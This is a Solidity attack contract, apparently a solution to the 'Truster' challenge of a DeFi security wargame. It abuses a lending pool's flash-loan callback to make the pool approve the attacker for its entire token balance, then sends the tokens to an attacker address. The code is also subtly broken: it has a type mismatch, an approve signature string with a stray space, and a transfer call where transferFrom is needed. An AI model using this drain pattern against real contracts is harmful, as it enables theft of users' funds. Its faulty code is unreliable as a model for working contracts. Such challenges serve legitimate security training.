pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IPoolFunc {
    function flashLoan(
        uint256 borrowAmount,
        address borrower,
        address target,
        bytes calldata data
        ) external;
}

contract TrusterAttack {
    using Address for address;

    address public immutable pool;
    IERC20 public immutable token;
    address public immutable attacker;
    uint256 public balance;

    constructor(address poolAddress,
                address tokenAddress,
                address attackerAddress
               ) 
    {
        //Idea
        pool = poolAddress;
        token = IERC20(tokenAddress);
        attacker = attackerAddress;
        balance = token.balanceOf(pool);

        IPoolFunc(pool).flashLoan(
            0,
            address(this),
            token,
            abi.encodeWithSignature(
                "approve(address, uint256)",
                address(this),
                balance
            )
        );
        //IERC20(tokenAddress).transfer(attackerAddress, balance);
        //calldata = approve(pool, this)
        //response 
        //token.tranfser(amount,attacker)
        //
    }
    function transferMe() public{
        token.transfer(attacker, balance);
    }

   
}